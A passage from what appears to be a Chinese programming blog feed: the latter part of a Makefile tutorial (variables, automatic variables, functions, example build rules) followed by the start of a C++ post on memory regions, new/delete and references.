World<br><span class="hljs-section">test:</span><br>    @echo <span class="hljs-variable">$(txt)</span><br></code></pre></td></tr></table></figure><p>上面代码中，变量 txt 等于 Hello World。调用时，变量需要放在 $( ) 之中。</p><p>调用Shell变量，需要在美元符号前，再加一个美元符号，这是因为Make命令会对美元符号转义。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">test:</span><br>    @echo $$HOME<br></code></pre></td></tr></table></figure><p>有时，变量的值可能指向另一个变量。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">v1 = <span class="hljs-variable">$(v2)</span><br></code></pre></td></tr></table></figure><p>上面代码中，变量 v1 的值是另一个变量 v2。这时会产生一个问题，v1 的值到底在定义时扩展（静态扩展），还是在运行时扩展（动态扩展）？如果 v2 的值是动态的，这两种扩展方式的结果可能会差异很大。</p><p>为了解决类似问题，Makefile一共提供了四个赋值运算符 （&#x3D;、:&#x3D;、？&#x3D;、+&#x3D;），它们的区别请看<a href="https://stackoverflow.com/questions/448910/makefile-variable-assignment">StackOverflow</a>。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile">VARIABLE = value<br><span class="hljs-comment"># 在执行时扩展，允许递归扩展。</span><br><br>VARIABLE := value<br><span class="hljs-comment"># 在定义时扩展。</span><br><br>VARIABLE ?= value<br><span class="hljs-comment"># 只有在该变量为空时才设置值。</span><br><br>VARIABLE += value<br><span class="hljs-comment"># 将值追加到变量的尾端。</span><br></code></pre></td></tr></table></figure><h3 id="3-6-内置变量（Implicit-Variables）"><a href="#3-6-内置变量（Implicit-Variables）" class="headerlink" title="3.6 内置变量（Implicit Variables）"></a>3.6 内置变量（Implicit Variables）</h3><p>Make命令提供一系列内置变量，比如，$(CC) 指向当前使用的编译器，$(MAKE) 指向当前使用的Make工具。这主要是为了跨平台的兼容性，详细的内置变量清单见<a href="https://www.gnu.org/software/make/manual/html_node/Implicit-Variables.html">手册</a>。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">output:</span><br>    <span class="hljs-variable">$(CC)</span> -o output input.c<br></code></pre></td></tr></table></figure><h3 id="3-7-自动变量（Automatic-Variables）"><a href="#3-7-自动变量（Automatic-Variables）" class="headerlink" title="3.7 自动变量（Automatic Variables）"></a>3.7 自动变量（Automatic Variables）</h3><p>Make命令还提供一些自动变量，它们的值与当前规则有关。主要有以下几个。</p><p><strong>（1）$@</strong></p><p>$@指代当前目标，就是Make命令当前构建的那个目标。比如，<code>make foo</code>的 $@ 就指代foo。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">a.txt b.txt: <br>    touch <span class="hljs-variable">$@</span><br></code></pre></td></tr></table></figure><p>等同于下面的写法。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">a.txt:</span><br>    touch a.txt<br><span class="hljs-section">b.txt:</span><br>    touch b.txt<br></code></pre></td></tr></table></figure><p><strong>（2）$&lt;</strong></p><p>$&lt; 指代第一个前置条件。比如，规则为 t: p1 p2，那么$&lt; 就指代p1。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">a.txt: b.txt c.txt</span><br>    cp <span class="hljs-variable">$&lt;</span> <span class="hljs-variable">$@</span> <br></code></pre></td></tr></table></figure><p>等同于下面的写法。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">a.txt: b.txt c.txt</span><br>    cp b.txt a.txt <br></code></pre></td></tr></table></figure><p><strong>（3）$?</strong></p><p>$? 指代比目标更新的所有前置条件，之间以空格分隔。比如，规则为 t: p1 p2，其中 p2 的时间戳比 t 新，$?就指代p2。</p><p><strong>（4）$^</strong></p><p>$^ 指代所有前置条件，之间以空格分隔。比如，规则为 t: p1 p2，那么 $^ 就指代 p1 p2 。</p><p><strong>（5）$*</strong></p><p>$* 指代匹配符 % 匹配的部分， 比如% 匹配 f1.txt 中的f1 ，$* 就表示 f1。</p><p><strong>（6）$(@D) 和 $(@F)</strong></p><p>$(@D) 和 $(@F) 分别指向 $@ 的目录名和文件名。比如，$@是 src&#x2F;input.c，那么$(@D) 的值为 src ，$(@F) 的值为 input.c。</p><p><strong>（7）$(&lt;D) 和 $(&lt;F)</strong></p><p>$(&lt;D) 和 $(&lt;F) 分别指向 $&lt; 的目录名和文件名。</p><p>所有的自动变量清单，请看<a href="https://www.gnu.org/software/make/manual/html_node/Automatic-Variables.html">手册</a>。下面是自动变量的一个例子。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">dest/%.txt: src/%.txt</span><br>    @[ -d dest ] || mkdir dest<br>    cp <span class="hljs-variable">$&lt;</span> <span class="hljs-variable">$@</span><br></code></pre></td></tr></table></figure><p>上面代码将 src 目录下的 txt 文件，拷贝到 dest 目录下。首先判断 dest 目录是否存在，如果不存在就新建，然后，$&lt; 指代前置文件（src&#x2F;%.txt）， $@ 指代目标文件（dest&#x2F;%.txt）。</p><h3 id="3-8-判断和循环"><a href="#3-8-判断和循环" class="headerlink" title="3.8 判断和循环"></a>3.8 判断和循环</h3><p>Makefile使用 Bash 语法，完成判断和循环。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-keyword">ifeq</span> (<span class="hljs-variable">$(CC)</span>,gcc)<br>  libs=<span class="hljs-variable">$(libs_for_gcc)</span><br><span class="hljs-keyword">else</span><br>  libs=<span class="hljs-variable">$(normal_libs)</span><br><span class="hljs-keyword">endif</span><br></code></pre></td></tr></table></figure><p>上面代码判断当前编译器是否 gcc ，然后指定不同的库文件。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile">LIST = one two three<br><span class="hljs-section">all:</span><br>    for i in <span class="hljs-variable">$(LIST)</span>; do \<br>        echo $$i; \<br>    done<br><br><span class="hljs-comment"># 等同于</span><br><br><span class="hljs-section">all:</span><br>    for i in one two three; do \<br>        echo $i; \<br>    done<br></code></pre></td></tr></table></figure><p>上面代码的运行结果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">one<br>two<br>three<br></code></pre></td></tr></table></figure><h3 id="3-9-函数"><a href="#3-9-函数" class="headerlink" title="3.9 函数"></a>3.9 函数</h3><p>Makefile 还可以使用函数，格式如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$(<span class="hljs-keyword">function</span> arguments)<br><span class="hljs-comment"># 或者</span><br><span class="hljs-variable">$&#123;function arguments&#125;</span><br></code></pre></td></tr></table></figure><p>Makefile提供了许多<a href="https://www.gnu.org/software/make/manual/html_node/Functions.html">内置函数</a>，可供调用。下面是几个常用的内置函数。</p><p><strong>（1）shell 函数</strong></p><p>shell 函数用来执行 shell 命令</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">srcfiles := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> echo src/&#123;00..99&#125;.txt)</span><br></code></pre></td></tr></table></figure><p><strong>（2）wildcard 函数</strong></p><p>wildcard 函数用来在 Makefile 中，替换 Bash 的通配符。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">srcfiles := <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> src/*.txt)</span><br></code></pre></td></tr></table></figure><p><strong>（3）subst 函数</strong></p><p>subst 函数用来文本替换，格式如下。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">subst</span> from,to,text)</span><br></code></pre></td></tr></table></figure><p>下面的例子将字符串”feet on the street”替换成”fEEt on the strEEt”。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">subst</span> ee,EE,feet on the street)</span><br></code></pre></td></tr></table></figure><p>下面是一个稍微复杂的例子。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs makefile">comma:= ,<br>empty:=<br><span class="hljs-comment"># space变量用两个空变量作为标识符，当中是一个空格</span><br>space:= <span class="hljs-variable">$(empty)</span> <span class="hljs-variable">$(empty)</span><br>foo:= a b c<br>bar:= <span class="hljs-variable">$(<span class="hljs-built_in">subst</span> <span class="hljs-variable">$(space)</span>,<span class="hljs-variable">$(comma)</span>,<span class="hljs-variable">$(foo)</span>)</span><br><span class="hljs-comment"># bar is now `a,b,c&#x27;.</span><br></code></pre></td></tr></table></figure><p><strong>（4）patsubst函数</strong></p><p>patsubst 函数用于模式匹配的替换，格式如下。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">patsubst</span> pattern,replacement,text)</span><br></code></pre></td></tr></table></figure><p>下面的例子将文件名”x.c.c bar.c”，替换成”x.c.o bar.o”。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">patsubst</span> %.c,%.o,x.c.c bar.c)</span><br></code></pre></td></tr></table></figure><p><strong>（5）替换后缀名</strong></p><p>替换后缀名函数的写法是：变量名 + 冒号 + 后缀名替换规则。它实际上patsubst函数的一种简写形式。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">min: $(OUTPUT:.js=.min.js)</span><br></code></pre></td></tr></table></figure><p>上面代码的意思是，将变量OUTPUT中的后缀名 .js 全部替换成 .min.js 。</p><h2 id="四、Makefile-的实例"><a href="#四、Makefile-的实例" class="headerlink" title="四、Makefile 的实例"></a>四、Makefile 的实例</h2><p><strong>（1）执行多个目标</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: cleanall cleanobj cleandiff</span><br><br>cleanall : cleanobj cleandiff<br>        rm program<br><br>cleanobj :<br>        rm *.o<br><br>cleandiff :<br>        rm *.diff<br></code></pre></td></tr></table></figure><p>上面代码可以调用不同目标，删除不同后缀名的文件，也可以调用一个目标（cleanall），删除所有指定类型的文件。</p><p><strong>（2）编译C语言项目</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs makefile">edit : main.o kbd.o command.o display.o <br>    cc -o edit main.o kbd.o command.o display.o<br><br>main.o : main.c defs.h<br>    cc -c main.c<br>kbd.o : kbd.c defs.h command.h<br>    cc -c kbd.c<br>command.o : command.c defs.h command.h<br>    cc -c command.c<br>display.o : display.c defs.h<br>    cc -c display.c<br><br>clean :<br>     rm edit main.o kbd.o command.o display.o<br><br><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: edit clean</span><br></code></pre></td></tr></table></figure><p>今天，Make命令的介绍就到这里。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> Makefile </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++-知识点</title>
      <link href="/2022/04/24/C-%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2022/04/24/C-%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="C-核心编程"><a href="#C-核心编程" class="headerlink" title="C++核心编程"></a>C++核心编程</h1><p>本阶段主要针对C++<strong>面向对象</strong>编程技术做详细讲解，探讨C++中的核心和精髓。</p><span id="more"></span><h2 id="1-内存分区模型"><a href="#1-内存分区模型" class="headerlink" title="1 内存分区模型"></a>1 内存分区模型</h2><p>C++程序在执行时，将内存大方向划分为<strong>4个区域</strong></p><ul><li>代码区：存放函数体的二进制代码，由操作系统进行管理的</li><li>全局区：存放全局变量和静态变量以及常量</li><li>栈区：由编译器自动分配释放, 存放函数的参数值,局部变量等</li><li>堆区：由程序员分配和释放,若程序员不释放,程序结束时由操作系统回收</li></ul><p><strong>内存四区意义：</strong></p><p>不同区域存放的数据，赋予不同的生命周期, 给我们更大的灵活编程</p><h3 id="1-1-程序运行前"><a href="#1-1-程序运行前" class="headerlink" title="1.1 程序运行前"></a>1.1 程序运行前</h3><p>在程序编译后，生成了exe可执行程序，<strong>未执行该程序前</strong>分为两个区域<br><br><strong>代码区：</strong><br><br>存放 CPU 执行的机器指令</p><ul><li><p>代码区是<strong>共享</strong>的，共享的目的是对于频繁被执行的程序，只需要在内存中有一份代码即可</p></li><li><p>代码区是<strong>只读</strong>的，使其只读的原因是防止程序意外地修改了它的指令</p></li></ul><p><strong>全局区：</strong></p><ul><li><p>全局变量和静态变量存放在此.</p></li><li><p>全局区还包含了常量区, 字符串常量和其他常量也存放在此.  </p></li><li><p>区域的数据在程序结束后由操作系统释放 .</p></li></ul><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//全局变量</span><br><span class="hljs-type">int</span> g_a = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> g_b = <span class="hljs-number">10</span>;<br><br><span class="hljs-comment">//全局常量</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> c_g_a = <span class="hljs-number">10</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> c_g_b = <span class="hljs-number">10</span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-comment">//局部变量</span><br><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> b = <span class="hljs-number">10</span>;<br><br><span class="hljs-comment">//打印地址</span><br>cout &lt;&lt; <span class="hljs-string">&quot;局部变量a地址为： &quot;</span> &lt;&lt; (<span class="hljs-type">int</span>)&amp;a &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;局部变量b地址为： &quot;</span> &lt;&lt; (<span class="hljs-type">int</span>)&amp;b &lt;&lt; endl;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;全局变量g_a地址为： &quot;</span> &lt;&lt;  (<span class="hljs-type">int</span>)&amp;g_a &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;全局变量g_b地址为： &quot;</span> &lt;&lt;  (<span class="hljs-type">int</span>)&amp;g_b &lt;&lt; endl;<br><br><span class="hljs-comment">//静态变量</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> s_a = <span class="hljs-number">10</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> s_b = <span class="hljs-number">10</span>;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;静态变量s_a地址为： &quot;</span> &lt;&lt; (<span class="hljs-type">int</span>)&amp;s_a &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;静态变量s_b地址为： &quot;</span> &lt;&lt; (<span class="hljs-type">int</span>)&amp;s_b &lt;&lt; endl;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;字符串常量地址为： &quot;</span> &lt;&lt; (<span class="hljs-type">int</span>)&amp;<span class="hljs-string">&quot;hello world&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;字符串常量地址为： &quot;</span> &lt;&lt; (<span class="hljs-type">int</span>)&amp;<span class="hljs-string">&quot;hello world1&quot;</span> &lt;&lt; endl;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;全局常量c_g_a地址为： &quot;</span> &lt;&lt; (<span class="hljs-type">int</span>)&amp;c_g_a &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;全局常量c_g_b地址为： &quot;</span> &lt;&lt; (<span class="hljs-type">int</span>)&amp;c_g_b &lt;&lt; endl;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> c_l_a = <span class="hljs-number">10</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> c_l_b = <span class="hljs-number">10</span>;<br>cout &lt;&lt; <span class="hljs-string">&quot;局部常量c_l_a地址为： &quot;</span> &lt;&lt; (<span class="hljs-type">int</span>)&amp;c_l_a &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;局部常量c_l_b地址为： &quot;</span> &lt;&lt; (<span class="hljs-type">int</span>)&amp;c_l_b &lt;&lt; endl;<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>总结：</p><ul><li>C++中在程序运行前分为全局区和代码区</li><li>代码区特点是共享和只读</li><li>全局区中存放全局变量、静态变量、常量</li><li>常量区中存放 const修饰的全局常量  和 字符串常量</li></ul><h3 id="1-2-程序运行后"><a href="#1-2-程序运行后" class="headerlink" title="1.2 程序运行后"></a>1.2 程序运行后</h3><p><strong>栈区：</strong></p><p>由编译器自动分配释放, 存放函数的参数值,局部变量等</p><p>注意事项：不要返回局部变量的地址，栈区开辟的数据由编译器自动释放</p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> * <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">return</span> &amp;a;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-type">int</span> *p = <span class="hljs-built_in">func</span>();<br><br>cout &lt;&lt; *p &lt;&lt; endl;<br>cout &lt;&lt; *p &lt;&lt; endl;<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>堆区：</strong></p><ul><li><p>由程序员分配释放,若程序员不释放,程序结束时由操作系统回收</p></li><li><p>在C++中主要利用new在堆区开辟内存</p></li></ul><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span>* <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span>* a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">10</span>);<br><span class="hljs-keyword">return</span> a;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-type">int</span> *p = <span class="hljs-built_in">func</span>();<br><br>cout &lt;&lt; *p &lt;&lt; endl;<br>cout &lt;&lt; *p &lt;&lt; endl;<br>    <br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li><p>堆区数据由程序员管理开辟和释放</p></li><li><p>堆区数据利用new关键字进行开辟内存</p></li></ul><h3 id="1-3-new操作符"><a href="#1-3-new操作符" class="headerlink" title="1.3 new操作符"></a>1.3 new操作符</h3><p>C++中利用<code>new</code>操作符在堆区开辟数据<br><br>堆区开辟的数据，由程序员手动开辟，手动释放，释放利用操作符 <code>delete</code><br><br>语法：<code> new 数据类型</code><br><br>利用new创建的数据，会返回该数据对应的类型的指针</p><p><strong>示例1： 基本语法</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span>* <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span>* a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">10</span>);<br><span class="hljs-keyword">return</span> a;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-type">int</span> *p = <span class="hljs-built_in">func</span>();<br><br>cout &lt;&lt; *p &lt;&lt; endl;<br>cout &lt;&lt; *p &lt;&lt; endl;<br><br><span class="hljs-comment">//利用delete释放堆区数据</span><br><span class="hljs-keyword">delete</span> p;<br><br><span class="hljs-comment">//cout &lt;&lt; *p &lt;&lt; endl; //报错，释放的空间不可访问</span><br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>示例2：开辟数组</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//堆区开辟数组</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-type">int</span>* arr = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">10</span>];<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>&#123;<br>arr[i] = i + <span class="hljs-number">100</span>;<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>&#123;<br>cout &lt;&lt; arr[i] &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//释放数组 delete 后加 []</span><br><span class="hljs-keyword">delete</span>[] arr;<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="2-引用"><a href="#2-引用" class="headerlink" title="2 引用"></a>2 引用</h2><h3 id="2-1-引用的基本使用"><a href="#2-1-引用的基本使用" class="headerlink" title="2.1 引用的基本使用"></a>2.1 引用的基本使用</h3><p><strong>作用：</strong> 给变量起别名</p><p><strong>语法：</strong> <code>数据类型 &amp;别名 = 原名</code></p><p><strong>示例：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> &amp;b = a;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; endl;<br><br>b = <span class="hljs-number">100</span>;<br><br>cout &lt;&lt; <span class="hljs-string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; endl;<br><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-引用注意事项"><a href="#2-2-引用注意事项" class="headerlink" title="2.2 引用注意事项"></a>2.2 引用注意事项</h3><ul><li>引用必须初始化</li><li>引用在初始化后，不可以改变</li></ul><p>示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 